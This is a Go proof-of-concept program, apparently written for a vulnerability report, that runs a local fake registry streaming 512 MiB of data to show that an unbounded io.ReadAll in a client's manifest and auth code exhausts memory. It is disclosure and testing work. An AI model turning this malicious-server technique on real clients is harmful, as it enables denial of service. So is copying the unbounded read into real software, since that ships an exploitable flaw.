package main

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"runtime"
	"time"
)

// Simulates the exact pattern in server/images.go:864 and server/auth.go:81:
//   resp, _ := c.Do(req)
//   data, _ := io.ReadAll(resp.Body)
//
// Against a malicious registry serving a very large body.
func main() {
	const mb = 1 << 20
	// Serve 512 MiB of zero bytes — enough to clearly demonstrate unbounded
	// allocation without risking local OOM. In the real exploit the attacker
	// chooses the upper bound.
	const bodySize int64 = 512 * mb

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/vnd.docker.distribution.manifest.v2+json")
		w.WriteHeader(http.StatusOK)
		// Stream without a Content-Length header to mimic chunked / unbounded.
		buf := make([]byte, 64*1024)
		var sent int64
		for sent < bodySize {
			n, err := w.Write(buf)
			if err != nil {
				return
			}
			sent += int64(n)
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
		}
	}))
	defer srv.Close()

	// Baseline memory
	runtime.GC()
	var before runtime.MemStats
	runtime.ReadMemStats(&before)

	start := time.Now()
	req, _ := http.NewRequest(http.MethodGet, srv.URL+"/v2/evil/foo/manifests/latest", nil)
	req.Header.Set("Accept", "application/vnd.docker.distribution.manifest.v2+json")
	c := &http.Client{}
	resp, err := c.Do(req)
	if err != nil {
		fmt.Println("client err:", err)
		return
	}
	defer resp.Body.Close()

	// Exact sink pattern from server/images.go:864 / server/auth.go:81
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("readall err:", err)
		return
	}
	elapsed := time.Since(start)

	var after runtime.MemStats
	runtime.ReadMemStats(&after)

	fmt.Printf("bytes read    : %d (%.0f MiB)\n", len(data), float64(len(data))/float64(mb))
	fmt.Printf("elapsed       : %s\n", elapsed)
	fmt.Printf("heap before   : %.0f MiB\n", float64(before.HeapAlloc)/float64(mb))
	fmt.Printf("heap after    : %.0f MiB\n", float64(after.HeapAlloc)/float64(mb))
	fmt.Printf("total alloc   : %.0f MiB\n", float64(after.TotalAlloc-before.TotalAlloc)/float64(mb))
	fmt.Printf("sys           : %.0f MiB\n", float64(after.Sys)/float64(mb))
}
